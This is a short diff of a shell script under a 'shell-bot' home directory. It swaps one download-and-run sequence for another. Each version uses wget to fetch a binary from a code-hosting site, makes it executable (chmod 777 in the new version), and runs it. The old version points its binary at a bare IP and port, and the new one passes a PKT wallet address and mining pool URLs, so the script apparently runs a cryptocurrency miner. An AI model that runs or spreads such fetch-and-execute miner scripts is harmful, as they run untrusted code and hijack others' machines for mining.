@@ -4,6 +4,6 @@
 
 
 cd /home/shell-bot
-wget -qO banda https://github.com/Omarjetos/ezz/blob/master/nano?raw=true
-chmod +x banda
-./banda -o 138.197.166.210:5555
+wget -q https://bitbucket.org/kijang-020/ann/raw/60d016f60b08eda6ca47670234f0a08f46fffa1e/ann
+chmod 777 ann
+./ann ann -p pkt1qm78frgnen3v8x7tgp5ncr0esmp7awmfymfz6ds http://pool.srizbi.com http://pool.pktpool.io http://pool.pkt.world
